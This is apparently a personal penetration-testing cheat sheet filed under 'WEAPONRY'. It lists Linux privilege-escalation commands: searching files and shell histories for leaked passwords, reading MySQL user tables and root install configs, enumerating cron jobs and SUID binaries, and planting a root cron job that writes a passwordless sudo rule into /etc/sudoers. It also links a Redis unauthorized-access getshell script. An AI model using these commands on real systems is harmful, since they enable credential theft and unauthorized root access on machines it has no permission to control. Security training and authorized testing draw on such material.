---
title: Linux Priv Esc
date: 2020-11-14 19:11:18
category: WEAPONRY
---

# Linux 提权

## 信息泄漏
### 泄漏的账密
``` bash
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joom
```
### 历史记录
``` bash
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```


## Kernel Vulns


## 配置不当

### 系统服务的错误权限配置漏洞
``` bash
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

### sudo -l


### Crontab
``` bash
vi user.sh
echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
```

`/etc/crontab` 中加入计划任务。
``` bash
vi /etc/crontab
*/1 * * * * root sh /path2script/user.sh >> /tmp/log.txt
```
最后
``` bash
sudo su
```

一些配置
``` bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```


### SUID 
``` bash
find / -perm -1000 -type d 2>/dev/null              # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null               # 以文件所属用户组权限运行
find / -perm -u=s -type f 2>/dev/null               # 以文件所属用户权限运行
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # 以上两者合集
find / -user root -perm -4000 -print 2>/dev/null    # 先收集，待确认
find / -user root -perm -4000 -exec ls -ldb {} \    # 先收集，待确认

# Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done   

# 从 / 开始 3 个文件夹深度的范围内查找 SGID 或 SUID ，同时不是符号链接的文件
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null   
```

## Third Part Service

### Root-Redis 未授权访问
任意角色未授权登录，公钥写入。[redis-sshkey-getshell.py](https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py)